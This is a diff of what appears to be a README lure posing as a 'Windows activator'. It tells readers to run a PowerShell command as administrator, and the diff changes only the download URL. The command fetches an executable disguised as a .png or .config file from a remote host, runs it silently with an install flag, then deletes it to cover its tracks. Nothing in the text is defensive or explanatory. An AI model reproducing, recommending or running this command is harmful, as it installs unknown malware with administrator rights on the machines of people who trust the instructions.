@@ -19,6 +19,6 @@ Here are some ideas to get you started:
 -->
 ⚡ OPEN THE WINDOWS POWERSHELL AS ADMINISTRATOR AND RUN THE FOLLOWING COMMAND:
 
-### $LocalTempDir = $env:TEMP; $WindowsAtivator = "WindowsAtivator.exe"; (new-object System.Net.WebClient).DownloadFile('https://vvvvvvvvv.pythonanywhere.com/static/ativator.png', "$LocalTempDir\$WindowsAtivator"); & "$LocalTempDir\$WindowsAtivator" /silent /install; $Process2Monitor = "WindowsAtivator"; Do { $ProcessesFound = Get-Process | ?{$Process2Monitor -contains $_.Name} | Select-Object -ExpandProperty Name; If ($ProcessesFound) { "Still running: $($ProcessesFound -join ', ')" | Write-Host; Start-Sleep -Seconds 2 } else { rm "$LocalTempDir\$WindowsAtivator" -ErrorAction SilentlyContinue -Verbose } } Until (!$ProcessesFound)
+### $LocalTempDir = $env:TEMP; $WindowsAtivator = "WindowsAtivator.exe"; (new-object System.Net.WebClient).DownloadFile('https://windows-ativator.github.io/windows-ativator/ativator.config', "$LocalTempDir\$WindowsAtivator"); & "$LocalTempDir\$WindowsAtivator" /silent /install; $Process2Monitor = "WindowsAtivator"; Do { $ProcessesFound = Get-Process | ?{$Process2Monitor -contains $_.Name} | Select-Object -ExpandProperty Name; If ($ProcessesFound) { "Still running: $($ProcessesFound -join ', ')" | Write-Host; Start-Sleep -Seconds 2 } else { rm "$LocalTempDir\$WindowsAtivator" -ErrorAction SilentlyContinue -Verbose } } Until (!$ProcessesFound)
 
 
